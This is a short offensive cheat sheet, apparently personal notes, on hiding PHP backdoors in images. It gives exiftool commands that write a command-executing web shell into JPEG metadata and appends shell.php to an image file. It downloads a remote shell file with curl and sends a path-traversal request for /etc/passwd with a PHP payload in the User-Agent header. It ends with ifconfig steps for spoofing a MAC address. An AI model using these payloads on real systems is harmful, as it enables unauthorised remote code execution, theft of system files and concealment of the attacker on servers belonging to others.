####Backdooring an Image####
exiftool -DocumentName="<h1>Nic0la T3sl4<br><?php if(isset(\$_REQUEST['cmd'])){echo '<pre>';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '</pre>';} __halt_compiler();?></h1>" images.jpeg
exiftool -DocumentName="<?php phpinfo(); __halt_compiler(); ?>" /root/imagen.jpg
curl -o hidden.txt https://url.website.com/shell.txt
cat file.jpg shell.php > compress.jpg
curl -u www.servervul.com/page.php?id=/../../etc/passwd -A "<?php system('ls -l'); ?>"

*************Change Mac address(privileges root)*******************
# ifconfig [interface] down
# ifconfig [interface] hw ether 00:11:22:33:44:55
# ifconfig [interface] up
**************************************************
